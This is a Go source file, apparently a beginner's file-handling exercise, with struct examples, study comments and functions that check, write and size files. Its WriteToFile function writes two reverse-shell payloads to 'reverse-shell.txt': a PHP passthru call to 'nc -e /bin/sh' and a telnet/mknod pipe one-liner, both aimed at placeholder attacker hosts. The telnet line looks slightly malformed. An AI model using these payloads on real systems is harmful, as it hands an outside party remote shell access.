package fileManager

import (
	"bufio"
	"fmt"
	"log"
	"os"
	// "time"
)

type House struct {
	NoRooms int
	Price   int
	City    string
	Roomie  Room //composition
}

type Room struct {
	Color string
}

// a struct is mainly native and used for procedural programming while Classes are used in the concept of OOP
// a map is an object containing data in key value pairs
//no maps are not ordered
// variables are stored in memory

// a pointer is a variable that stores the location of a value in memory used especially in linked list

func CheckIfFileExist() {

	x := House{
		NoRooms: 1,
		Price:   250,
		City:    "atlanta",
		Roomie: Room{
			Color: "purple",
		},
	}

	fmt.Printf("color of my room is : %s\n", x.Roomie.Color)

	var filePath string
	fmt.Print("enter file path, e.g(path/to/file): ")
	fmt.Scanf("%s", &filePath)

	_, err := os.Stat(filePath) // get file info

	if err == nil {
		fmt.Printf("File '%s' exists.\n", filePath)
	} else if os.IsNotExist(err) {
		fmt.Printf("File '%s' does not exist.\n", filePath)
	} else {
		fmt.Printf("Error checking file: %v\n", err)
	}
}

func WriteToFile() {
	file, err := os.Create("reverse-shell.txt")
	if err != nil {
		log.Fatal(err)
		return
	}
	defer file.Close()
	//using bufio
	writer := bufio.NewWriter(file)
	data := "for php:\n<?php\n\t\tpassthru('nc -e /bin/sh attcking_ip 80');\n?>"
	_, err = writer.Write([]byte(data))
	if err != nil {
		log.Fatal(err)
	}
	writer.Flush()
	fmt.Println("Data succesfully written to file")
	//using normal os write
	file.Write([]byte("\n\nfor telnet:\nrm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p\n"))
	fmt.Println("Data succesfully written to file")

	var userInput string
	fmt.Println("Enter Data to be Written to file:\n ")
	scanner := bufio.NewScanner(os.Stdin)
	if scanner.Scan() {
		userInput = scanner.Text()
	} else {
		log.Println(err)
	}
	file.WriteString(userInput)
}

func CheckFileSize() {
	var filepath string
	fmt.Print("enter file path to check file size, e.g(path/to/file): ")
	fmt.Scanf("%s", &filepath)
	fileSize, err := os.Stat(filepath)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("%s is %d bytes", filepath, fileSize.Size())
}
